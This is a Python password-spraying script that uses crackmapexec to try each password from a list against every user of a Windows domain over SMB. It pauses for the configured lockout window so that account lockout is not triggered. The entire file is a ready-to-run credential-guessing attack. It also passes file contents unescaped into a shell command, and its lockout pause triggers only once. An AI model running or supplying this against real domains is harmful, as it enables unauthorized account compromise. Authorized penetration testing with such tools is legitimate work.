#!/usr/bin/env python3

import argparse
import subprocess
import time
import sys

def banner():
    print("""
                            , ____
                            ~(__  \.
   .--------__               :o \. |                 __--------.
  ( _________ \              `.  |_|                / _________ )
   ( _________ `o-___________-`-.-'-_____________-o' _________ )
    ( _________  `-----------(.v(.)-------------'  _________ )
      \____________________  `-   -'  ______________________/
         \___________________'\ * /`_____________________/
                        ______: . :
                       / _____ /   )
                      : /    /'  /'
                      : l   /  /
                      :)   (  :---._
                   ..//     `--------O\..

             get yourself a cup of coffee this might take a while... :)
      """)

def main():
    parser = argparse.ArgumentParser(description="Password testing script with options.")
    parser.add_argument("--user", "-u", required=True, help="File containing user IDs")
    parser.add_argument("--password", "-p", required=True, help="File containing passwords to be tested")
    parser.add_argument("--treshold", "-t", type=int, default=5, help="Account Lockout Threshold")
    parser.add_argument("--lockout", "-l", type=int, default=15, help="Reset Account Lockout Counter in minutes")
    parser.add_argument("--domain", "-d", required=True, help="Domain name")
    parser.add_argument("--pass-length", "-pl", type=int, required=True, help="Minimum password length")
    args = parser.parse_args()

    domain_name = args.domain
    pass_length = args.pass_length

    try:
        number_of_runs = 0
        with open(args.user, 'r') as file_users:
            user_lines = file_users.readlines()
        with open(args.password, 'r') as file_passwords:
            pass_lines = file_passwords.readlines()

        banner()
        print("\n=== Starting Script ====")

        for pass_idx, pass_line in enumerate(pass_lines):
            password = pass_line.strip()

            cme_command = f"crackmapexec smb '{domain_name}' -u $(cat {args.user}) -p '{password}' --continue-on-success"
            p = subprocess.Popen(cme_command, shell=True, stdout=subprocess.PIPE, text=True)

            for output_line in p.stdout:
                print(output_line)
                
            number_of_runs = number_of_runs + 1
            p.stdout.close()
            p.wait()

            if number_of_runs == (args.treshold - 3):
                start_time = time.time()
                end_time = start_time + (args.lockout * 60)
                while time.time() < end_time:
                    remaining_time = int(end_time - time.time())
                    minutes, seconds = divmod(remaining_time, 60)
                    time_format = '{:02d}:{:02d}'.format(minutes, seconds)
                    print(f"Threshold reached - waiting for Lockout Timer: {time_format}", end='\r')
                    time.sleep(1)
            else:
                continue

    except KeyboardInterrupt:
        print("\n\nKeyboardInterrupt received. Exit script...")
        sys.exit(0)

if __name__ == "__main__":
    main()
